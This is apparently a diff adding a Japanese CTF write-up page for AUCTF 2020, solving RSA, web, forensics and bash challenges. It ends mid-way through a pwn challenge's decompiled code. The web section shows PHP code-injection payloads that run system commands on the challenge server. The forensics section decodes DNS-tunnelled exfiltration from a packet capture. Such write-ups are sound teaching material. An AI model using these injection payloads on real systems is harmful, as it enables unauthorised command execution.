@@ -1,0 +1,1353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>AUCTF 2020 Writeup | フラxxグゲット - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました。 Password Cracking はもう少し解" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.59.1 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/auctf_2020/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="https://captureamerica.github.io/writeups/dist/even.c2a46f00.min.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="AUCTF 2020 Writeup | フラxxグゲット" />
+<meta property="og:description" content="URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました。 Password Cracking はもう少し解" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/auctf_2020/" />
+<meta property="article:published_time" content="2020-04-06T13:00:00+09:00" />
+<meta property="article:modified_time" content="2020-04-06T13:00:00+09:00" />
+<meta itemprop="name" content="AUCTF 2020 Writeup | フラxxグゲット">
+<meta itemprop="description" content="URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました。 Password Cracking はもう少し解">
+
+
+<meta itemprop="datePublished" content="2020-04-06T13:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2020-04-06T13:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="4220">
+
+
+
+<meta itemprop="keywords" content="CTF," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="AUCTF 2020 Writeup | フラxxグゲット"/>
+<meta name="twitter:description" content="URL: https://ctf.auburn.edu/challenges チャレンジ数が多かった！！ 時間が足りない。 Bashの問題 (Over The Wire みたいなやつ)とか、いろいろ面白いチャレンジもありました。 Password Cracking はもう少し解"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">AUCTF 2020 Writeup | フラxxグゲット</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-04-06 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#cryptography-pretty-ridiculous">[Cryptography]: Pretty Ridiculous</a>
+<ul>
+<li><a href="#challenge">Challenge</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul></li>
+<li><a href="#web-miyazaki-trivia">[Web]: Miyazaki Trivia</a>
+<ul>
+<li><a href="#challenge-1">Challenge</a></li>
+<li><a href="#solution-1">Solution</a></li>
+</ul></li>
+<li><a href="#web-quick-maths">[Web]: Quick Maths</a>
+<ul>
+<li><a href="#challenge-2">Challenge</a></li>
+<li><a href="#solution-2">Solution</a></li>
+</ul></li>
+<li><a href="#web-gg-no-re">[Web]: gg no re</a>
+<ul>
+<li><a href="#challenge-3">Challenge</a></li>
+<li><a href="#solution-3">Solution</a></li>
+</ul></li>
+<li><a href="#forensics-block2">[Forensics]: Block2</a>
+<ul>
+<li><a href="#challenge-4">Challenge</a></li>
+<li><a href="#solution-4">Solution</a></li>
+</ul></li>
+<li><a href="#forensics-animal-crossing">[Forensics]: Animal Crossing</a>
+<ul>
+<li><a href="#challenge-5">Challenge</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul></li>
+<li><a href="#pwn-thanksgiving-dinner">[Pwn]: Thanksgiving Dinner</a>
+<ul>
+<li><a href="#challenge-6">Challenge</a></li>
+<li><a href="#solution-6">Solution</a></li>
+</ul></li>
+<li><a href="#bash-bash-2">[Bash]: Bash 2</a>
+<ul>
+<li><a href="#challenge-7">Challenge</a></li>
+<li><a href="#solution-7">Solution</a></li>
+</ul></li>
+<li><a href="#bash-bash-3">[Bash]: Bash 3</a>
+<ul>
+<li><a href="#challenge-8">Challenge</a></li>
+<li><a href="#solution-8">Solution</a></li>
+</ul></li>
+<li><a href="#bash-bash-4">[Bash]: Bash 4</a>
+<ul>
+<li><a href="#challenge-9">Challenge</a></li>
+<li><a href="#solution-9">Solution</a></li>
+</ul></li>
+<li><a href="#bash-bash-5">[Bash]: Bash 5</a>
+<ul>
+<li><a href="#challenge-10">Challenge</a></li>
+<li><a href="#solution-10">Solution</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>URL: <a href="https://ctf.auburn.edu/challenges" target="_blank">https://ctf.auburn.edu/challenges</a>
+<br /><br />
+チャレンジ数が多かった！！ 時間が足りない。</p>
+
+<p><br>
+Bashの問題 (<a href="https://overthewire.org/wargames/" target="_blank">Over The Wire</a> みたいなやつ)とか、いろいろ面白いチャレンジもありました。</p>
+
+<p>Password Cracking はもう少し解きたかったなぁ。。
+<br /><br /></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score1.png" alt="auctf_2020_Score1.png"></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score2.png" alt="auctf_2020_Score2.png"></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score3.png" alt="auctf_2020_Score3.png"></p>
+
+<p><br /></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall1.png" alt="auctf_2020_Chall1.png"></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall2.png" alt="auctf_2020_Chall2.png"></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall3.png" alt="auctf_2020_Chall3.png"></p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall4.png" alt="auctf_2020_Chall4.png"></p>
+
+<p><br /><br /></p>
+
+<h2 id="cryptography-pretty-ridiculous">[Cryptography]: Pretty Ridiculous</h2>
+
+<hr />
+
+<h3 id="challenge">Challenge</h3>
+
+<blockquote>
+<p>Eve discovered that a piece of paper had been shoved into her pocket.. what could it be? The message she found can be downloaded at the following link:
+<br /><br />
+(n,e) = (627585038806247, 65537)</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>message.txt</li>
+</ul>
+
+<table><tr><td bgcolor="#f8f5ec">
+[145213650433152, 4562349440334, 24272724667960, 598242834066721, 89584939111364, 426756492371444, 511701778613016, 551732685650248, 296367799892003, 63113462897284, 198510931603899, 321201931522255, 401044612595398, 542697603423052, 213898535689643, 275839755798105, 185841409622217, 551732685650248, 121188708737752, 401044612595398, 512808963720303, 275839755798105, 198510931603899, 275839755798105, 401044612595398, 174484844253615, 551732685650248, 174486913717420, 575163265381617, 213898535689643, 401044612595398, 49103824223436, 551732685650248, 401044612595398, 598242834066721, 202722428784490, 306606077829794, 53801100921263, 401044612595398, 184805755675232, 405971446461049, 296367799892003, 275839755798105, 275839755798105, 401044612595398, 358054299396778, 4562349440334, 320837325468842, 401044612595398, 202722428784490, 551732685650248, 321201931522255, 228350651363859]
+</td></tr></table>
+
+<p><br /></p>
+
+<h3 id="solution">Solution</h3>
+
+<p>1個ずつRsaCtfTool.pyで解きます。trコマンドを使ってmessage.txtの &quot;,&quot; を &quot;\n&quot; に変換してcipher.txtとして保存しておきました。</p>
+
+<pre>
+$ for c in $(cat cipher.txt); do ~/Python3/RsaCtfTool/RsaCtfTool.py -n 627585038806247 -e 65537 --uncipher $c ; done
+
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00a'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00u'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00c'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00t'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00f'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00{'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00R'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x004'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00l'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00L'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00y'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00P'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00r'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00M'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00s'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00w'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00L'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[!] Warning: Wiener attack module missing (wiener_attack.py) or SymPy not installed?
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00n'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00v'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00E'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00r'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00b'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00t'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00h'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00I'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x005'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00S'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00m'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x004'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00B'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00u'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00T'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00h'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00y'
+[+] Clear text : b'\x00\x00\x00\x00\x00\x00}'
+</pre>
+
+<p><br />
+結果を rsa_result.txt として保存（エラーの行は削除）して、後ろから2文字目だけを取り出します。</p>
+
+<pre>
+$ cat rsa_result.txt | rev | cut -c 2 | tr -d "\n" ; echo
+auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}
+</pre>
+
+<p><br />
+Flag: <code>auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="web-miyazaki-trivia">[Web]: Miyazaki Trivia</h2>
+
+<hr />
+
+<h3 id="challenge-1">Challenge</h3>
+
+<blockquote>
+<p><a href="http://challenges.auctf.com:30020" target="_blank">http://challenges.auctf.com:30020</a>
+<br /><br />
+Here's a bit of trivia for you vidya game nerds.</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="solution-1">Solution</h3>
+
+<p>robots.txtにアクセスすると、以下が書かれています。</p>
+
+<table><tr><td bgcolor="#f8f5ec">
+VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars? MAKE a GET request to this page with a header named 'answer' to submit your answer.
+fear the old blood. but master willem
+</td></tr></table>
+
+<p><br />
+adage についていろいろ調べて試したところ、<code>Fear the Old Blood</code>が正解みたいです。</p>
+
+<pre>
+$ curl -H "answer:Fear the Old Blood" http://challenges.auctf.com:30020/robots.txt
+Master Willem was right.auctf{f3ar_z_olD3_8l0oD}
+</pre>
+
+<p><br />
+Flag: <code>auctf{f3ar_z_olD3_8l0oD}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="web-quick-maths">[Web]: Quick Maths</h2>
+
+<hr />
+
+<h3 id="challenge-2">Challenge</h3>
+
+<blockquote>
+<p><a href="http://challenges.auctf.com:30021" target="_blank">http://challenges.auctf.com:30021</a>
+<br /><br />
+two plus two is four minus three that's one quick maths</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="solution-2">Solution</h3>
+
+<p>Webにアクセスすると、テキストボックスがあって、そこで計算をしてくれるようです。</p>
+
+<p><code>2+2;phpinfo()</code> を試したところ、phpinfoが取れました。</p>
+
+<p>そこで、<code>2+2;system('ls -l')</code> を試したところ、以下が取れました。</p>
+
+<pre>
+4total 264
+-rwxr-xr-x 1 www-data www-data 130736 Apr 4 09:09 date
+-rwxr-xr-x 1 root root 560 Mar 31 19:34 index.php
+-rwxr-xr-x 1 www-data www-data 130736 Apr 4 09:09 ls
+-rw-r--r-- 1 www-data www-data 6 Apr 4 09:02 test.txt
+</pre>
+
+<p><br />
+どうやら、date, lsはELFファイルで、おそらく他の人のテストによって生成されちゃったファイル。</p>
+
+<p>test.txtも関係ないファイルでした。</p>
+
+<p>index.phpの中にフラグがあると予想して、<code>2+2;system(&quot;grep ctf index.php&quot;)</code> でフラグを取りました。</p>
+
+<p><br />
+Flag: <code>auctf{p6p_1nj3c7i0n_iz_k3wl}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="web-gg-no-re">[Web]: gg no re</h2>
+
+<hr />
+
+<h3 id="challenge-3">Challenge</h3>
+
+<blockquote>
+<p><a href="http://challenges.auctf.com:30022" target="_blank">http://challenges.auctf.com:30022</a>
+<br /><br />
+A junior dev built this site but we want you to test it before we send it to production.</p>
+</blockquote>
+
+<p><br /></p>
+
+<h3 id="solution-3">Solution</h3>
+
+<p>ページのソースを見ると、以下のjsファイルが見つかります。</p>
+
+<p><a href="http://challenges.auctf.com:30022/authentication.js" target="_blank">http://challenges.auctf.com:30022/authentication.js</a></p>
+
+<p><br /><br />
+authentication.jsの中にbase64でエンコードされた箇所があるので、とりあえずデコードしてみます。</p>
+
+<pre>
+$ echo "TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw" | base64 -d
+Make a GET request to /hidden/nextstep.php
+</pre>
+
+<p><br /><br />
+言われた通り /hidden/nextstep.php にブラウザでアクセスしてみるも、特に何も見つからなかったので <code>curl -v</code> でアクセスしました。</p>
+
+<pre>
+$ curl http://challenges.auctf.com:30022/hidden/nextstep.php -v
+*   Trying 157.245.252.113:30022...
+* TCP_NODELAY set
+*   Trying 2604:a880:400:d0::18f4:3001:30022...
+* TCP_NODELAY set
+* Immediate connect fail for 2604:a880:400:d0::18f4:3001: Network is unreachable
+* Connected to challenges.auctf.com (157.245.252.113) port 30022 (#0)
+> GET /hidden/nextstep.php HTTP/1.1
+> Host: challenges.auctf.com:30022
+> User-Agent: curl/7.67.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Sun, 05 Apr 2020 01:43:29 GMT
+< Server: Apache/2.4.25 (Debian)
+< X-Powered-By: PHP/7.0.33
+< BAS64: TWFrZSBhIFBPU1QgcmVxdWVzdCB0byAvYXBpL2ZpbmFsLnBocA==    <--- なんか返ってきた。
+< Content-Length: 15
+< Content-Type: text/html; charset=UTF-8
+< 
+* Connection #0 to host challenges.auctf.com left intact
+Howdy neighbor!
+</pre>
+
+<p><br /><br />
+受け取ったBase64文字列をデコードします。</p>
+
+<pre>
+$ echo TWFrZSBhIFBPU1QgcmVxdWVzdCB0byAvYXBpL2ZpbmFsLnBocA== | base64 -d
+Make a POST request to /api/final.php
+</pre>
+
+<p><br /><br />
+フラグゲットです。</p>
+
+<pre>
+$ curl -X POST -d flag http://challenges.auctf.com:30022/api/final.php
+auctf{1_w@s_laZ_w1t_dis_0N3} 
+
+$ curl -d flag http://challenges.auctf.com:30022/api/final.php
+auctf{1_w@s_laZ_w1t_dis_0N3}
+</pre>
+
+<p><br />
+Flag: <code>auctf{1_w@s_laZ_w1t_dis_0N3}</code></p>
+
+<p><br />
+＃ところで、チャレンジ名の <code>gg no re</code> はどういう意味なんでしょうね。そっちの方がナゾです。</p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="forensics-block2">[Forensics]: Block2</h2>
+
+<hr />
+
+<h3 id="challenge-4">Challenge</h3>
+
+<blockquote>
+<p>Billy runs a minecraft server. He wants to know which block was rolled back. Can you help him?
+<br /><br />
+NONSTANDARD FLAG FORMAT: Insert the unix timestamp of the row into auctf{time_stamp}</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>co_block.sql.gz</li>
+</ul>
+
+<p>ファイルの中身の抜粋。
+<pre>
+INSERT INTO <code>co_block</code> (<code>rowid</code>, <code>time</code>, <code>user</code>, <code>rolled_back</code>, <code>wid</code>, <code>x</code>, <code>y</code>, <code>z</code>, <code>type</code>, <code>data</code>, <code>meta</code>, <code>blockdata</code>, <code>action</code>) VALUES
+(612512,    1581375173, 3,  0,  1,  612,    5,  1757,   2,  0,  NULL,   '43',   1),
+(612513,    1581375173, 3,  0,  1,  610,    5,  1759,   2,  0,  NULL,   '43',   1),
+</pre></p>
+
+<p><br /></p>
+
+<h3 id="solution-4">Solution</h3>
+
+<p>INSERT INTO の行から、各Columnの意味がわかります。<code>time</code>と<code>rolled_back</code>だけに注目したらよさそうです。</p>
+
+<pre>
+$ grep '^(' co_block.sql | cut -d, -f2,4 | grep 1$
+    1581060905, 1
+</pre>
+
+<p><br />
+Flag: <code>auctf{1581060905}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="forensics-animal-crossing">[Forensics]: Animal Crossing</h2>
+
+<hr />
+
+<h3 id="challenge-5">Challenge</h3>
+
+<blockquote>
+<p>While looking for the Animal Crossing Nintendo Switch you find weird traffic on your network. Investigate.</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>animalcrossing.pcapng</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-5">Solution</h3>
+
+<p>pcapにいろいろ含まれていますが、<code>weird traffic</code> と言えばDNSが明らかに怪しいです。</p>
+
+<pre>
+$ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v response | grep -v "org."
+   36   2.250193   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A RGlkIHlvdSBldmVyIGhlYXIgdGhlIHRyYWdlZHkgb2YgRGFydGggUGxhZ.ad.quickbrownfoxes.org
+   50   2.267361   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A 3VlaXMgVGhlIFdpc2U/IEkgdGhvdWdodCBub3QuIEl04oCZcyBub3QgYS.ad.quickbrownfoxes.org
+   64   2.285230   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A BzdG9yeSB0aGUgSmVkaSB3b3VsZCB0ZWxsIHlvdS4gSXTigJlzIGEgU2l.ad.quickbrownfoxes.org
+   78   2.301872   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A 0aCBsZWdlbmQuIERhcnRoIFBsYWd1ZWlzIHdhcyBhIERhcmsgTG9yZCBv.ad.quickbrownfoxes.org
+   92   2.318390   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A ZiB0aGUgU2l0aCwgc28gcG93ZXJmdWwgYW5kIHNvIHdpc2UgaGUgY291b.ad.quickbrownfoxes.org
+  106   2.335391   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A GQgdXNlIHRoZSBGb3JjZSB0byBpbmZsdWVuY2UgdGhlIG1pZGljaGxvcm.ad.quickbrownfoxes.org
+  120   2.354043   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A lhbnMgdG8gY3JlYXRlIGxpZmXigKYgYXVjdGZ7aXRfd2FzX3N0YXJfd2F.ad.quickbrownfoxes.org
+  134   2.370916   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A yc19hbGxfYWxvbmd9IEhlIGhhZCBzdWNoIGEga25vd2xlZGdlIG9mIHRo.ad.quickbrownfoxes.org
+  148   2.389254   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A ZSBkYXJrIHNpZGUgdGhhdCBoZSBjb3VsZCBldmVuIGtlZXAgdGhlIG9uZ.ad.quickbrownfoxes.org
+  162   2.407589   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A XMgaGUgY2FyZWQgYWJvdXQgZnJvbSBkeWluZy4gVGhlIGRhcmsgc2lkZS.ad.quickbrownfoxes.org
+  176   2.425737   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A BvZiB0aGUgRm9yY2UgaXMgYSBwYXRod2F5IHRvIG1hbnkgYWJpbGl0aWV.ad.quickbrownfoxes.org
+  190   2.443757   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A zIHNvbWUgY29uc2lkZXIgdG8gYmUgdW5uYXR1cmFsLiBIZSBiZWNhbWUg.ad.quickbrownfoxes.org
+  204   2.462298   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A c28gcG93ZXJmdWzigKYgdGhlIG9ubHkgdGhpbmcgaGUgd2FzIGFmcmFpZ.ad.quickbrownfoxes.org
+  218   2.479877   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A CBvZiB3YXMgbG9zaW5nIGhpcyBwb3dlciwgd2hpY2ggZXZlbnR1YWxseS.ad.quickbrownfoxes.org
+  232   2.498347   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A wgb2YgY291cnNlLCBoZSBkaWQuIFVuZm9ydHVuYXRlbHksIGhlIHRhdWd.ad.quickbrownfoxes.org
+  246   2.516018   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A odCBoaXMgYXBwcmVudGljZSBldmVyeXRoaW5nIGhlIGtuZXcsIHRoZW4g.ad.quickbrownfoxes.org
+  260   2.534242   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A aGlzIGFwcHJlbnRpY2Uga2lsbGVkIGhpbSBpbiBoaXMgc2xlZXAuIElyb.ad.quickbrownfoxes.org
+  274   2.552026   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A 25pYy4gSGUgY291bGQgc2F2ZSBvdGhlcnMgZnJvbSBkZWF0aCwgYnV0IG.ad.quickbrownfoxes.org
+  684  11.324828   10.1.1.103 → 10.1.1.10    DNS 74 Standard query 0xe9db A www.odrive.com
+</pre>
+
+<p>（最後のwww.odrive.comは無視します。）</p>
+
+<p><br />
+名前のところだけ取り出します。
+<pre>
+$ tshark -r animalcrossing.pcapng dns | grep &quot;A &quot; | grep -v AAAA | grep -v response | grep -v &quot;org.&quot; | awk '{print $12}' | cut -d. -f1 | tr -d &quot;\n&quot;
+</pre></p>
+
+<p><br /></p>
+
+<p>base64でデコードするとフラグが見つかります。</p>
+
+<table><tr><td bgcolor="#f8f5ec">
+Did you ever hear the tragedy of Darth Plagueis The Wise? I thought not. It’s not a story the Jedi would tell you. It’s a Sith legend. Darth Plagueis was a Dark Lord of the Sith, so powerful and so wise he could use the Force to influence the midichlorians to create life… <font color="red">auctf{it_was_star_wars_all_along}</font> He had such a knowledge of the dark side that he could even keep the ones he cared about from dying. The dark side of the Force is a pathway to many abilities some consider to be unnatural. He became so powerful… the only thing he was afraid of was losing his power, which eventually, of course, he did. Unfortunately, he taught his apprentice everything he knew, then his apprentice killed him in his sleep. Ironic. He could save others from death, but base64: invalid input
+</td></tr></table>
+
+<p><br />
+Flag: <code>auctf{it_was_star_wars_all_along}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="pwn-thanksgiving-dinner">[Pwn]: Thanksgiving Dinner</h2>
+
+<hr />
+
+<h3 id="challenge-6">Challenge</h3>
+
+<blockquote>
+<p>I just ate a huge dinner. I can barley eat anymore... so please don't give me too much!
+<br /><br />
+nc challenges.auctf.com 30011
+<br /><br />
+Note: ASLR is disabled for this challenge</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>turkey (ELF 32bit)</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-6">Solution</h3>
+
+<p>Ghidraでソースを確認します。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
